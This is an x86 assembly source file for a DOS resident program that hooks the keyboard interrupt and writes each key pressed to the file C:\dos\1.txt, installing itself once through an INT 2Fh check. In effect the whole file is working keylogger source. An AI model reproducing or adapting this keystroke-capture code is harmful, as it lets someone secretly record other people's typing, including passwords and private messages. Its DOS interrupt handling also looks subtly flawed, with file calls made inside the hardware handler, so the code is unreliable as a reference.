.model tiny    

.code    

.386   

org 100h

resident:                 
                
    jmp init  
    
    data: 
    
        old_int_9 dd 0
        old_int_2f dd 0        

        filename db "C:\dos\1.txt", 0  
        
        message db "TSR is existing.", 10, 13, '$'

        error_message_1 db "Can't create file.", 10, 13, '$'
        error_message_2 db "Can't open file.", 10, 13, '$'
        error_message_3 db "Can't write to file.", 10, 13, '$' 

        symbol db 0  
        
        flag db 0    
        
        write_flag db 0  
        
write_string macro string 
    
    mov ah, 9
    lea dx, string
    int 21h  
    
endm 

cursor_write macro  
    
    mov ax, 4202h  
    mov dx, 0
    mov cx, 0
    int 21h   

    mov ah, 40h
    mov dx, offset symbol  
    mov cx, 1    
    int 21h   
    
endm 
        
create_file proc 
    
    mov ah, 3ch
    mov cx, 0
    lea dx, filename 
    int 21h  
    
    jnc exit_from_create_file 
    
    file_error_of_create_file: 
    
       xchg bx, dx
    
        write_string filename   
    
        xchg bx, dx
       
        write_string error_message_1
        
        mov flag, 1  
       
    exit_from_create_file:
    
    ret 
    
create_file endp      
    
open_file proc  
    
    push cs
    
    pop ds
    
    mov ah, 3dh
    mov al, 2
    lea dx, filename 
    int 21h           
        
    mov bx, ax   
        
    jnc exit_from_open_file 
    
    file_error_of_open_file: 
        
        write_string error_message_2 
        
        mov flag, 1    
       
    exit_from_open_file:
    
        ret 
    
open_file endp  
    
close_file proc  
    
    push cs
    
    pop ds
    
    mov ah, 3eh
    int 21h 
        
    ret 
        
close_file endp  

write_file proc   
     
     in al, 60h         
               
     mov ah, 01h
     int 16h  
    
    mov symbol, al
    
    call open_file 
    
    cmp flag, 1
    je exit_proc   
    
    cursor_write  
    
    jnc exit_from_write_file
    
    file_error_of_write_file: 
    
        write_string error_message_3      
       
    exit_from_write_file: 
                          
        call close_file  
    
    exit_proc:  
        
        ret 
        
write_file endp  

int_9_handler proc  
    
    pushf  
    
    call cs:old_int_9 
    
    pusha
    
    push ds
    push es 
    
    push cs
    
    pop ds   
    
    read:     
    
        in al, 60h  
    
        cmp al, 80h
        ja exit  
    
        call write_file  
        
    exit:   
    
        mov al,  20h
        out 20h, al 
                      
        pop es
        pop ds     
    
        popa  
    
        iret       
    
int_9_handler endp 

int_2f_handler proc 
    
    cmp ah,0f1h         
    jne call_2f   
    
    cmp al,00h          
    jne call_2f
    
    mov al, 0ffh  
    
    iret 
        
    call_2f:
    
        jmp cs:old_int_2f      
    
int_2f_handler endp 

program proc                     
    
    call create_file 
    
    cmp flag, 1
    je exit_program 
    
    call open_file   
     
    cmp flag, 1
    je exit_program  
        
    close:
        
        call close_file
        
    exit_program:      
    
        ret 
            
program endp    

    init: 
    
        mov ah, 0f1h        
        mov al, 0    
        int 2fh 
         
        cmp al, 0ffh  
        je exit_of_resident
        
        mov ah, 35h
        mov al, 09h
        int 21h     
    
        mov word ptr old_int_9, bx
        mov word ptr old_int_9+2, es    
    
        mov ah, 25h
        mov al, 09h   
        lea dx, int_9_handler 
        int 21h     
        
        mov ah, 35h
        mov al, 2fh
        int 21h     
    
        mov word ptr old_int_2f, bx
        mov word ptr old_int_2f+2, es    
    
        mov ah, 25h
        mov al, 2fh   
        lea dx, int_2f_handler 
        int 21h  
        
        call program       
    
        mov ah, 31h
        mov al, 00h
        mov dx, (init - resident + 10fh) / 16
        int 21h
        
        exit_of_resident:
            
            write_string message  
        
            exit_asm:
            
                mov ax, 4c00h
                int 21h        
                      
end resident     
